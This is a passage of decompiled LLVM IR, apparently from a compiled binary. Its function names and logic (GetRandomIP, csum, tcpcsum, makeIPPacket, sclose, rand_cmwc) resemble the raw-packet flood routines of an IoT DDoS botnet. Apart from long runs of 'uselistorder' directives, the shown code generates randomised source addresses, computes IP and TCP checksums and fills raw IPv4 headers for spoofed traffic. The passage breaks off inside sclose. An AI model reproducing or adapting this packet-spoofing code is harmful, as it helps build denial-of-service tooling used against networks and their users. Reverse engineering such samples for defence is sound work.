  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b418.161 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1b388.139 to i32), { 1, 0 }
  uselistorder i8* @global_var_265e6.83, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_265e5.82, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d7e8, { 1, 0 }
  uselistorder label %dec_label_pc_d7b4, { 1, 0 }
  uselistorder label %dec_label_pc_d780, { 1, 0 }
  uselistorder label %dec_label_pc_d74c, { 1, 0 }
  uselistorder label %dec_label_pc_d718, { 1, 0 }
  uselistorder label %dec_label_pc_d6e4, { 1, 0 }
  uselistorder label %dec_label_pc_d6b0, { 1, 0 }
  uselistorder label %dec_label_pc_d648, { 1, 0 }
  uselistorder label %dec_label_pc_d614, { 1, 0 }
  uselistorder label %dec_label_pc_d5e0, { 1, 0 }
  uselistorder label %dec_label_pc_d5ac, { 1, 0 }
  uselistorder label %dec_label_pc_d578, { 1, 0 }
  uselistorder label %dec_label_pc_d544, { 1, 0 }
  uselistorder label %dec_label_pc_d510, { 1, 0 }
  uselistorder label %dec_label_pc_d4dc, { 1, 0 }
  uselistorder label %dec_label_pc_d4a8, { 1, 0 }
  uselistorder label %dec_label_pc_d474, { 1, 0 }
  uselistorder label %dec_label_pc_d440, { 1, 0 }
  uselistorder label %dec_label_pc_d40c, { 1, 0 }
  uselistorder label %dec_label_pc_d3d8, { 1, 0 }
  uselistorder label %dec_label_pc_d3a4, { 1, 0 }
  uselistorder label %dec_label_pc_d370, { 1, 0 }
  uselistorder label %dec_label_pc_d33c, { 1, 0 }
  uselistorder label %dec_label_pc_d308, { 1, 0 }
  uselistorder label %dec_label_pc_d2d4, { 1, 0 }
  uselistorder label %dec_label_pc_d2a0, { 1, 0 }
  uselistorder label %dec_label_pc_d26c, { 1, 0 }
  uselistorder label %dec_label_pc_d238, { 1, 0 }
  uselistorder label %dec_label_pc_d204, { 1, 0 }
  uselistorder label %dec_label_pc_d1d0, { 1, 0 }
  uselistorder label %dec_label_pc_d19c, { 1, 0 }
  uselistorder label %dec_label_pc_d168, { 1, 0 }
  uselistorder label %dec_label_pc_d134, { 1, 0 }
  uselistorder label %dec_label_pc_d100, { 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d098, { 1, 0 }
  uselistorder label %dec_label_pc_d064, { 1, 0 }
  uselistorder label %dec_label_pc_d030, { 1, 0 }
  uselistorder label %dec_label_pc_cffc, { 1, 0 }
  uselistorder label %dec_label_pc_cfc8, { 1, 0 }
  uselistorder label %dec_label_pc_cf94, { 1, 0 }
  uselistorder label %dec_label_pc_cf60, { 1, 0 }
  uselistorder label %dec_label_pc_cf2c, { 1, 0 }
  uselistorder label %dec_label_pc_cef8, { 1, 0 }
  uselistorder label %dec_label_pc_cec4, { 1, 0 }
  uselistorder label %dec_label_pc_ce90, { 1, 0 }
  uselistorder label %dec_label_pc_ce5c, { 1, 0 }
  uselistorder label %dec_label_pc_ce28, { 1, 0 }
  uselistorder label %dec_label_pc_cdf4, { 1, 0 }
  uselistorder label %dec_label_pc_cdc0, { 1, 0 }
  uselistorder label %dec_label_pc_cd8c, { 1, 0 }
  uselistorder label %dec_label_pc_cd58, { 1, 0 }
  uselistorder label %dec_label_pc_cd24, { 1, 0 }
  uselistorder label %dec_label_pc_ccf0, { 1, 0 }
  uselistorder label %dec_label_pc_ccbc, { 1, 0 }
  uselistorder label %dec_label_pc_cc88, { 1, 0 }
  uselistorder label %dec_label_pc_cc54, { 1, 0 }
  uselistorder label %dec_label_pc_cc20, { 1, 0 }
  uselistorder label %dec_label_pc_cbec, { 1, 0 }
  uselistorder label %dec_label_pc_cbb8, { 1, 0 }
  uselistorder label %dec_label_pc_cb84, { 1, 0 }
  uselistorder label %dec_label_pc_cb50, { 1, 0 }
  uselistorder label %dec_label_pc_cb1c, { 1, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0 }
  uselistorder label %dec_label_pc_cab4, { 1, 0 }
  uselistorder label %dec_label_pc_ca80, { 1, 0 }
  uselistorder label %dec_label_pc_ca4c, { 1, 0 }
  uselistorder label %dec_label_pc_ca18, { 1, 0 }
  uselistorder label %dec_label_pc_c9e4, { 1, 0 }
  uselistorder label %dec_label_pc_c9b0, { 1, 0 }
  uselistorder label %dec_label_pc_c97c, { 1, 0 }
  uselistorder label %dec_label_pc_c948, { 1, 0 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %dec_label_pc_c8e0, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c844, { 1, 0 }
  uselistorder label %dec_label_pc_c810, { 1, 0 }
  uselistorder label %dec_label_pc_c7dc, { 1, 0 }
  uselistorder label %dec_label_pc_c7a8, { 1, 0 }
  uselistorder label %dec_label_pc_c774, { 1, 0 }
  uselistorder label %dec_label_pc_c740, { 1, 0 }
  uselistorder label %dec_label_pc_c70c, { 1, 0 }
  uselistorder label %dec_label_pc_c6d8, { 1, 0 }
  uselistorder label %dec_label_pc_c6a4, { 1, 0 }
  uselistorder label %dec_label_pc_c670, { 1, 0 }
  uselistorder label %dec_label_pc_c63c, { 1, 0 }
  uselistorder label %dec_label_pc_c608, { 1, 0 }
  uselistorder label %dec_label_pc_c5d4, { 1, 0 }
  uselistorder label %dec_label_pc_c5a0, { 1, 0 }
  uselistorder label %dec_label_pc_c56c, { 1, 0 }
  uselistorder label %dec_label_pc_c538, { 1, 0 }
  uselistorder label %dec_label_pc_c504, { 1, 0 }
  uselistorder label %dec_label_pc_c4d0, { 1, 0 }
  uselistorder label %dec_label_pc_c49c, { 1, 0 }
  uselistorder label %dec_label_pc_c468, { 1, 0 }
  uselistorder label %dec_label_pc_c434, { 1, 0 }
  uselistorder label %dec_label_pc_c400, { 1, 0 }
  uselistorder label %dec_label_pc_c3cc, { 1, 0 }
  uselistorder label %dec_label_pc_c398, { 1, 0 }
  uselistorder label %dec_label_pc_c364, { 1, 0 }
  uselistorder label %dec_label_pc_c330, { 1, 0 }
  uselistorder label %dec_label_pc_c2fc, { 1, 0 }
  uselistorder label %dec_label_pc_c2c8, { 1, 0 }
  uselistorder label %dec_label_pc_c294, { 1, 0 }
  uselistorder label %dec_label_pc_c260, { 1, 0 }
  uselistorder label %dec_label_pc_c22c, { 1, 0 }
  uselistorder label %dec_label_pc_c1f8, { 1, 0 }
  uselistorder label %dec_label_pc_c1c4, { 1, 0 }
  uselistorder label %dec_label_pc_c190, { 1, 0 }
  uselistorder label %dec_label_pc_c15c, { 1, 0 }
  uselistorder label %dec_label_pc_c128, { 1, 0 }
  uselistorder label %dec_label_pc_c0f4, { 1, 0 }
  uselistorder label %dec_label_pc_c0c0, { 1, 0 }
  uselistorder label %dec_label_pc_c08c, { 1, 0 }
  uselistorder label %dec_label_pc_c058, { 1, 0 }
  uselistorder label %dec_label_pc_c024, { 1, 0 }
  uselistorder label %dec_label_pc_bff0, { 1, 0 }
  uselistorder label %dec_label_pc_bfbc, { 1, 0 }
  uselistorder label %dec_label_pc_bf88, { 1, 0 }
  uselistorder label %dec_label_pc_bf54, { 1, 0 }
  uselistorder label %dec_label_pc_bf20, { 1, 0 }
  uselistorder label %dec_label_pc_beec, { 1, 0 }
  uselistorder label %dec_label_pc_beb8, { 1, 0 }
  uselistorder label %dec_label_pc_be84, { 1, 0 }
  uselistorder label %dec_label_pc_be50, { 1, 0 }
  uselistorder label %dec_label_pc_be1c, { 1, 0 }
  uselistorder label %dec_label_pc_bde8, { 1, 0 }
  uselistorder label %dec_label_pc_bdb4, { 1, 0 }
  uselistorder label %dec_label_pc_bd80, { 1, 0 }
  uselistorder label %dec_label_pc_bd4c, { 1, 0 }
  uselistorder label %dec_label_pc_bd18, { 1, 0 }
  uselistorder label %dec_label_pc_bce4, { 1, 0 }
  uselistorder label %dec_label_pc_bcb0, { 1, 0 }
  uselistorder label %dec_label_pc_ba34, { 1, 0 }
  uselistorder label %dec_label_pc_ba00, { 1, 0 }
  uselistorder label %dec_label_pc_b9cc, { 1, 0 }
  uselistorder label %dec_label_pc_b998, { 1, 0 }
  uselistorder label %dec_label_pc_b964, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 1, 0 }
  uselistorder label %dec_label_pc_b8fc, { 1, 0 }
  uselistorder label %dec_label_pc_b8c8, { 1, 0 }
  uselistorder label %dec_label_pc_b894, { 1, 0 }
  uselistorder label %dec_label_pc_b860, { 1, 0 }
  uselistorder label %dec_label_pc_b82c, { 1, 0 }
  uselistorder label %dec_label_pc_b7f8, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_b790, { 1, 0 }
  uselistorder label %dec_label_pc_b75c, { 1, 0 }
  uselistorder label %dec_label_pc_b728, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
  uselistorder label %dec_label_pc_b6c0, { 1, 0 }
  uselistorder label %dec_label_pc_b68c, { 1, 0 }
  uselistorder label %dec_label_pc_b658, { 1, 0 }
  uselistorder label %dec_label_pc_b624, { 1, 0 }
  uselistorder label %dec_label_pc_b5f0, { 1, 0 }
  uselistorder label %dec_label_pc_b5bc, { 1, 0 }
  uselistorder label %dec_label_pc_b588, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 1, 0 }
  uselistorder label %dec_label_pc_b4ec, { 1, 0 }
  uselistorder label %dec_label_pc_b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_b484, { 1, 0 }
  uselistorder label %dec_label_pc_b450, { 1, 0 }
  uselistorder label %dec_label_pc_b41c, { 1, 0 }
  uselistorder label %dec_label_pc_b3e8, { 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b380, { 1, 0 }
  uselistorder label %dec_label_pc_b34c, { 1, 0 }
  uselistorder label %dec_label_pc_b318, { 1, 0 }
  uselistorder label %dec_label_pc_b2e4, { 1, 0 }
  uselistorder label %dec_label_pc_b2b0, { 1, 0 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b248, { 1, 0 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b178, { 1, 0 }
  uselistorder label %dec_label_pc_b144, { 1, 0 }
  uselistorder label %dec_label_pc_b110, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0a8, { 1, 0 }
  uselistorder label %dec_label_pc_b074, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
  uselistorder label %dec_label_pc_b00c, { 1, 0 }
  uselistorder label %dec_label_pc_afd8, { 1, 0 }
  uselistorder label %dec_label_pc_afa4, { 1, 0 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af3c, { 1, 0 }
  uselistorder label %dec_label_pc_af08, { 1, 0 }
  uselistorder label %dec_label_pc_aed4, { 1, 0 }
  uselistorder label %dec_label_pc_aea0, { 1, 0 }
  uselistorder label %dec_label_pc_ae6c, { 1, 0 }
  uselistorder label %dec_label_pc_ae38, { 1, 0 }
  uselistorder label %dec_label_pc_ae04, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_ad9c, { 1, 0 }
  uselistorder label %dec_label_pc_ad68, { 1, 0 }
  uselistorder label %dec_label_pc_ad34, { 1, 0 }
  uselistorder label %dec_label_pc_ad00, { 1, 0 }
  uselistorder label %dec_label_pc_accc, { 1, 0 }
  uselistorder label %dec_label_pc_ac98, { 1, 0 }
  uselistorder label %dec_label_pc_ac64, { 1, 0 }
  uselistorder label %dec_label_pc_ac30, { 1, 0 }
  uselistorder label %dec_label_pc_abfc, { 1, 0 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_ab94, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_d918 = load i32, i32* @fp, align 4
  %v2_d92c = load i32, i32* @global_var_2c848.477, align 4
  %v1_d934 = call i32 @ntohl(i32 %v2_d92c)
  %v2_d940 = and i32 %v1_d934, %arg1
  %v0_d948 = call i32 @rand_cmwc()
  %v1_d954 = sub i32 -1, %arg1
  %v2_d958 = and i32 %v0_d948, %v1_d954
  %v2_d960 = xor i32 %v2_d958, %v2_d940
  store i32 %v3_d918, i32* @fp, align 4
  ret i32 %v2_d960

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_d9f09 = icmp sgt i32 %arg2, 1
  br i1 %v8_d9f09, label %dec_label_pc_d9a0, label %dec_label_pc_d9f4

dec_label_pc_d9a0:                                ; preds = %entry, %dec_label_pc_d9a0
  %v2_d9bc = phi i32 [ %v2_d9c0, %dec_label_pc_d9a0 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_d9c4, %dec_label_pc_d9a0 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_d9e0, %dec_label_pc_d9a0 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_d9d8, %dec_label_pc_d9a0 ], [ %arg1, %entry ]
  %v4_d9a0 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_d9a4 = load i8, i8* %stack_var_-32.010, align 1
  %v3_d9a4 = zext i8 %v2_d9a4 to i32
  %v1_d9a8 = add i32 %v4_d9a0, 1
  %v2_d9a8 = inttoptr i32 %v1_d9a8 to i8*
  %v3_d9a8 = load i8, i8* %v2_d9a8, align 1
  %v4_d9a8 = zext i8 %v3_d9a8 to i32
  %v4_d9ac = mul nuw nsw i32 %v4_d9a8, 256
  %v5_d9ac = or i32 %v4_d9ac, %v3_d9a4
  %v2_d9c0 = add i32 %v5_d9ac, %v2_d9bc
  %v3_d9c0 = icmp ult i32 %v2_d9c0, %v2_d9bc
  %v4_d9c4 = zext i1 %v3_d9c0 to i32
  %v5_d9c4 = add i32 %v4_d9c4, %stack_var_-40.012
  %v1_d9d4 = add i32 %v4_d9a0, 2
  %v5_d9d8 = inttoptr i32 %v1_d9d4 to i8*
  %v1_d9e0 = add nsw i32 %stack_var_-36.011, -2
  %v8_d9f0 = icmp sgt i32 %v1_d9e0, 1
  br i1 %v8_d9f0, label %dec_label_pc_d9a0, label %dec_label_pc_d9f4

dec_label_pc_d9f4:                                ; preds = %dec_label_pc_d9a0, %entry
  %v2_da14 = phi i32 [ 0, %entry ], [ %v2_d9c0, %dec_label_pc_d9a0 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_d9d8, %dec_label_pc_d9a0 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_d9c4, %dec_label_pc_d9a0 ]
  %v7_d9ec.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_d9e0, %dec_label_pc_d9a0 ]
  %v7_d9ec.lcssa = icmp eq i32 %v7_d9ec.lcssa.in, 1
  br i1 %v7_d9ec.lcssa, label %dec_label_pc_da00, label %dec_label_pc_da7c.preheader

dec_label_pc_da00:                                ; preds = %dec_label_pc_d9f4
  %v2_da04 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_da04 = zext i8 %v2_da04 to i32
  %v2_da18 = add i32 %v3_da04, %v2_da14
  %v3_da18 = icmp ult i32 %v2_da18, %v2_da14
  %v4_da1c = zext i1 %v3_da18 to i32
  %v5_da1c = add i32 %v4_da1c, %stack_var_-40.0.lcssa
  br label %dec_label_pc_da7c.preheader

dec_label_pc_da7c.preheader:                      ; preds = %dec_label_pc_da00, %dec_label_pc_d9f4
  %v3_daa8.ph = phi i32 [ %v2_da14, %dec_label_pc_d9f4 ], [ %v2_da18, %dec_label_pc_da00 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_d9f4 ], [ %v5_da1c, %dec_label_pc_da00 ]
  %v3_da8036 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_da8837 = udiv i32 %v3_daa8.ph, 65536
  %v2_da8c38 = or i32 %v3_da8036, %v3_da8837
  %v3_da9439 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_da9c40 = or i32 %v2_da8c38, %v3_da9439
  %v2_daa041 = icmp eq i32 %v2_da9c40, 0
  br i1 %v2_daa041, label %dec_label_pc_daa8, label %dec_label_pc_da2c

dec_label_pc_da2c:                                ; preds = %dec_label_pc_da7c.preheader, %dec_label_pc_da2c
  %v3_da9444 = phi i32 [ %v3_da94, %dec_label_pc_da2c ], [ %v3_da9439, %dec_label_pc_da7c.preheader ]
  %v2_da8c43 = phi i32 [ %v2_da8c, %dec_label_pc_da2c ], [ %v2_da8c38, %dec_label_pc_da7c.preheader ]
  %v3_daa842 = phi i32 [ %v2_da6c, %dec_label_pc_da2c ], [ %v3_daa8.ph, %dec_label_pc_da7c.preheader ]
  %v2_da40 = urem i32 %v3_daa842, 65536
  %v2_da6c = add i32 %v2_da8c43, %v2_da40
  %v3_da6c = icmp ult i32 %v2_da6c, %v2_da40
  %v4_da70 = zext i1 %v3_da6c to i32
  %v5_da70 = add nuw nsw i32 %v4_da70, %v3_da9444
  %v3_da80 = mul i32 %v5_da70, 65536
  %v3_da88 = udiv i32 %v2_da6c, 65536
  %v2_da8c = or i32 %v3_da80, %v3_da88
  %v3_da94 = udiv i32 %v5_da70, 65536
  %v2_da9c = or i32 %v2_da8c, %v3_da94
  %v2_daa0 = icmp eq i32 %v2_da9c, 0
  br i1 %v2_daa0, label %dec_label_pc_da7c.dec_label_pc_daa8_crit_edge, label %dec_label_pc_da2c

dec_label_pc_da7c.dec_label_pc_daa8_crit_edge:    ; preds = %dec_label_pc_da2c
  br label %dec_label_pc_daa8

dec_label_pc_daa8:                                ; preds = %dec_label_pc_da7c.dec_label_pc_daa8_crit_edge, %dec_label_pc_da7c.preheader
  %v3_daa8.lcssa = phi i32 [ %v2_da6c, %dec_label_pc_da7c.dec_label_pc_daa8_crit_edge ], [ %v3_daa8.ph, %dec_label_pc_da7c.preheader ]
  %v1_dab4 = urem i32 %v3_daa8.lcssa, 65536
  %v3_dabc = xor i32 %v1_dab4, 65535
  ret i32 %v3_dabc

; uselistorder directives
  uselistorder i32 %v2_da8c, { 1, 0 }
  uselistorder i32 %v5_da70, { 1, 0 }
  uselistorder i32 %v2_da6c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_da9439, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_daa8.ph, { 2, 1, 0 }
  uselistorder i32 %v2_da14, { 0, 2, 1 }
  uselistorder i32 %v1_d9e0, { 0, 2, 1 }
  uselistorder i32 %v2_d9c0, { 0, 2, 1 }
  uselistorder i32 %v2_d9bc, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_da2c, { 1, 0 }
  uselistorder label %dec_label_pc_d9a0, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_dad0 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_db08 = add i32 %arg1, 12
  %v2_db08 = inttoptr i32 %v1_db08 to i32*
  %v3_db08 = load i32, i32* %v2_db08, align 4
  store i32 %v3_db08, i32* %stack_var_-44, align 4
  %v1_db30 = call i32 @htons(i32 20)
  %v1_db54 = call i32 @malloc(i32 32)
  %v2_db64 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_db54, i32* @r0, align 4
  store i32 %v2_db64, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_db78 = call i32 @memcpy()
  %v1_db80 = add i32 %v1_db54, 12
  %v3_db84 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_db80, i32* @r0, align 4
  store i32 %v3_db84, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_db98 = call i32 @memcpy()
  %v2_dba4 = inttoptr i32 %v1_db54 to i8*
  %v3_dba4 = call i32 @csum(i8* %v2_dba4, i32 32)
  %sext2 = mul i32 %v3_dba4, 16777216
  %v3_dbb0 = ashr i32 %sext2, 31
  store i32 %v1_db54, i32* @r0, align 4
  %v0_dbbc = call i32 @free()
  %v3_dbc4 = sdiv i32 %sext2, 16777216
  %v4_dbc8 = mul nsw i32 %v3_dbb0, 256
  %v4_dbcc = and i32 %v4_dbc8, 65280
  %v5_dbcc = or i32 %v4_dbcc, %v3_dbc4
  store i32 %v3_dad0, i32* @fp, align 4
  ret i32 %v5_dbcc

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_db54, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_dbe0 = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_dc00 = load i8, i8* %arg1, align 1
  %v4_dc08 = zext i8 %v2_dc00 to i32
  %v1_dc0c = and i32 %v4_dc08, 240
  %v1_dc10 = or i32 %v1_dc0c, 5
  store i32 %v1_dc10, i32* %r3.global-to-local, align 4
  %v1_dc1c = trunc i32 %v1_dc10 to i8
  store i8 %v1_dc1c, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_dc4c = add i32 %tmp4, 1
  %v4_dc4c = inttoptr i32 %v3_dc4c to i8*
  store i8 0, i8* %v4_dc4c, align 1
  %v3_dc50 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_dc50, 20
  %v3_dc64 = urem i32 %fold, 65536
  store i32 %v3_dc64, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_dc6c = trunc i32 %fold to i8
  %v3_dc6c = add i32 %tmp4, 2
  %v4_dc6c = inttoptr i32 %v3_dc6c to i8*
  store i8 %v1_dc6c, i8* %v4_dc6c, align 1
  %v0_dc70 = load i32, i32* %r3.global-to-local, align 4
  %v3_dc70 = sdiv i32 %v0_dc70, 256
  store i32 %v3_dc70, i32* %r3.global-to-local, align 4
  %v1_dc74 = trunc i32 %v3_dc70 to i8
  %v2_dc74 = load i32, i32* %r2.global-to-local, align 4
  %v3_dc74 = add i32 %v2_dc74, 3
  %v4_dc74 = inttoptr i32 %v3_dc74 to i8*
  store i8 %v1_dc74, i8* %v4_dc74, align 1
  %v0_dc78 = call i32 @rand_cmwc()
  %v3_dc84 = urem i32 %v0_dc78, 65536
  store i32 %v3_dc84, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_dc8c = trunc i32 %v0_dc78 to i8
  %v3_dc8c = add i32 %tmp4, 4
  %v4_dc8c = inttoptr i32 %v3_dc8c to i8*
  store i8 %v1_dc8c, i8* %v4_dc8c, align 1
  %v0_dc90 = load i32, i32* %r3.global-to-local, align 4
  %v3_dc903 = udiv i32 %v0_dc90, 256
  %v1_dc94 = trunc i32 %v3_dc903 to i8
  %v2_dc94 = load i32, i32* %r2.global-to-local, align 4
  %v3_dc94 = add i32 %v2_dc94, 5
  %v4_dc94 = inttoptr i32 %v3_dc94 to i8*
  store i8 %v1_dc94, i8* %v4_dc94, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dca0 = add i32 %tmp4, 6
  %v4_dca0 = inttoptr i32 %v3_dca0 to i8*
  store i8 0, i8* %v4_dca0, align 1
  %v0_dca4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dca4 = trunc i32 %v0_dca4 to i8
  %v2_dca4 = load i32, i32* %r2.global-to-local, align 4
  %v3_dca4 = add i32 %v2_dca4, 7
  %v4_dca4 = inttoptr i32 %v3_dca4 to i8*
  store i8 %v1_dca4, i8* %v4_dca4, align 1
  %v3_dcb0 = add i32 %tmp4, 8
  %v4_dcb0 = inttoptr i32 %v3_dcb0 to i8*
  store i8 -1, i8* %v4_dcb0, align 1
  %v3_dcbc = add i32 %tmp4, 9
  %v4_dcbc = inttoptr i32 %v3_dcbc to i8*
  store i8 %tmp, i8* %v4_dcbc, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dcc8 = add i32 %tmp4, 10
  %v4_dcc8 = inttoptr i32 %v3_dcc8 to i8*
  store i8 0, i8* %v4_dcc8, align 1
  %v0_dccc = load i32, i32* %r3.global-to-local, align 4
  %v1_dccc = trunc i32 %v0_dccc to i8
  %v2_dccc = load i32, i32* %r2.global-to-local, align 4
  %v3_dccc = add i32 %v2_dccc, 11
  %v4_dccc = inttoptr i32 %v3_dccc to i8*
  store i8 %v1_dccc, i8* %v4_dccc, align 1
  %v2_dcd8 = add i32 %tmp4, 12
  %v3_dcd8 = inttoptr i32 %v2_dcd8 to i32*
  store i32 %arg3, i32* %v3_dcd8, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_dce4 = add i32 %tmp4, 16
  %v3_dce4 = inttoptr i32 %v2_dce4 to i32*
  store i32 %arg2, i32* %v3_dce4, align 4
  store i32 %v3_dbe0, i32* @fp, align 4
  ret i32 %v0_dc78

; uselistorder directives
  uselistorder i32 %v0_dc78, { 1, 2, 0 }
  uselistorder i32 %v3_dc70, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_dd0c = icmp sgt i32 %arg1, 2
  br i1 %v8_dd0c, label %dec_label_pc_dd1c, label %dec_label_pc_dd2c

dec_label_pc_dd1c:                                ; preds = %entry
  %v1_dd20 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_dd2c

dec_label_pc_dd2c:                                ; preds = %entry, %dec_label_pc_dd1c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_dd1c ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
